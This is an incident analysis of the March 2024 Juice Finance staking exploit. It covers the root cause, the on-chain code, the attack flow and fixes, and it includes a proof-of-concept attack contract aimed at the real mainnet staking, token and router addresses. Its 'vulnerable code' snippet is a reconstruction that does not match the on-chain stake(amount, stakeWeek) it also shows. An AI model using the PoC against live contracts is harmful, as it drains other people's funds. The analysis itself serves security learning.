# Juice — Staking Instant Reward Claiming Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | Juice Finance |
| **Chain** | Ethereum |
| **Loss** | ~54 ETH |
| **Attacker** | [0x3fA19214](https://etherscan.io/address/0x3fA19214705BC82cE4b898205157472A79D026BE) |
| **Attack Contract** | [0xa8b45dEE](https://etherscan.io/address/0xa8b45dEE8306b520465f1f8da7E11CD8cFD1bBc4) |
| **Vulnerable Contract** | [Stake 0x8584ddbd](https://etherscan.io/address/0x8584ddbd1e28bca4bc6fb96bafe39f850301940e) |
| **JUICE Token** | [0xdE5d2530](https://etherscan.io/address/0xdE5d2530A877871F6f0fc240b9fCE117246DaDae) |
| **Root Cause** | Reward calculation logic flaw allowing disproportionately large rewards to be claimed via `harvest()` after just 1 block following `stake()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Juice_exp.sol) |

---

## 1. Vulnerability Overview

Juice Finance's staking contract contains a logic flaw that allows excessive rewards to be claimed via `harvest()` after only a single block has elapsed since `stake()`. The attacker purchased JUICE with a small amount of ETH, staked with an extremely large lockDuration (3,000,000,000), then called `harvest()` one block later to collect ~54 ETH worth of rewards.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: allows bulk reward claiming immediately after staking
interface IStake {
    function stake(uint256 amount, uint256 lockDuration) external;
    function harvest(uint256 stakeId) external;
}

// Internal reward calculation logic:
// reward = amount * lockDuration * rewardRate / PRECISION
// Setting lockDuration extremely high enables immediate bulk reward calculation
// No validation of reward payout timing (harvest possible after 1 block)

function harvest(uint256 stakeId) external {
    StakeInfo storage info = stakes[msg.sender][stakeId];
    uint256 reward = calculateReward(info);  // Calculated immediately based on lockDuration
    // No minimum staking duration check
    rewardToken.transfer(msg.sender, reward);
    delete stakes[msg.sender][stakeId];
}

// ✅ Safe code: minimum staking duration + reward cap
uint256 public constant MIN_STAKE_DURATION = 7 days;
uint256 public constant MAX_REWARD_PER_STAKE = 10 ether;

function harvest(uint256 stakeId) external {
    StakeInfo storage info = stakes[msg.sender][stakeId];
    require(
        block.timestamp >= info.startTime + MIN_STAKE_DURATION,
        "too early"
    );
    uint256 reward = min(calculateReward(info), MAX_REWARD_PER_STAKE);
    rewardToken.transfer(msg.sender, reward);
    delete stakes[msg.sender][stakeId];
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: JuiceStaking.sol
	function stake(uint256 amount, uint256 stakeWeek) external {  // ❌ Vulnerability
	    require(IERC20(Juice).balanceOf(address(msg.sender)) >= amount, "Balance not available for staking");
		require(stakeWeek > 0, "stakeWeek must be greater than or equal to one");
		require(stakingStartTime > 0, "Staking is not started yet");
		require(stakingEndTime > block.timestamp, "Staking is closed");
		
		_updatePool();
		
		uint256 stakeCount = stakingCount[address(msg.sender)];
		
		IERC20(Juice).safeTransferFrom(address(msg.sender), address(this), amount);
		JuiceStaked += amount;
		stakingCount[address(msg.sender)] += 1;
		
		mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount = amount;
		mapStakingInfo[address(msg.sender)][stakeCount].startTime = block.timestamp;
		mapStakingInfo[address(msg.sender)][stakeCount].endTime = block.timestamp + (stakeWeek * 7 days);
		mapStakingInfo[address(msg.sender)][stakeCount].stakingWeek = stakeWeek;
		mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt = (amount * rewardPerShare) / precisionFactor;
        emit Stake(address(msg.sender), amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] 0.5 ETH → JUICE swap (Uniswap V2)
  │
  ├─→ [2] stake(juiceAmount, 3_000_000_000)
  │         └─ Maximize reward multiplier with extremely large lockDuration
  │
  ├─→ [3] Wait 1 block + 12 seconds
  │
  ├─→ [4] harvest(stakeId)
  │         └─ Instantly claim bulk rewards based on lockDuration
  │
  ├─→ [5] JUICE → ETH swap
  │
  └─→ [6] ~54 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IStake {
    function stake(uint256 amount, uint256 lockDuration) external;
    function harvest(uint256 stakeId) external;
}

contract AttackContract {
    IStake    constant staking = IStake(0x8584ddbd1e28bca4bc6fb96bafe39f850301940e);
    IERC20    constant JUICE   = IERC20(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);
    IUniRouter constant router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function testExploit() external payable {
        // [1] ETH → JUICE swap
        swapETHToJUICE(0.5 ether);

        uint256 juiceBalance = JUICE.balanceOf(address(this));
        JUICE.approve(address(staking), juiceBalance);

        // [2] Stake with extremely large lockDuration (maximize reward multiplier)
        staking.stake(juiceBalance, 3_000_000_000);

        // [3] Harvest after 1 block (vm.roll(block.number + 1) in test)
        staking.harvest(0);

        // [4] JUICE → ETH swap
        uint256 rewardBalance = JUICE.balanceOf(address(this));
        swapJUICEToETH(rewardBalance);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Staking reward logic flaw |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (stake + harvest with 1-block interval) |
| **DApp Category** | Staking reward contract |
| **Impact** | Mass drainage of reward pool funds |

## 6. Remediation Recommendations

1. **Minimum staking duration**: Require a minimum of N days of staking before `harvest()` is permitted
2. **lockDuration cap**: Reject abnormally large lockDuration inputs
3. **Reward cap**: Limit the maximum claimable reward amount per single staking position
4. **Linear reward distribution**: Apply linear distribution proportional to staking duration instead of immediate payout

## 7. Lessons Learned

- When staking rewards are directly proportional to the `lockDuration` parameter, submitting an extremely large value allows instant bulk reward collection.
- Failing to validate a minimum actual elapsed time at the point of reward claiming renders the reward formula meaningless.
- Staking contract reward logic must always explicitly cap the maximum claimable amount.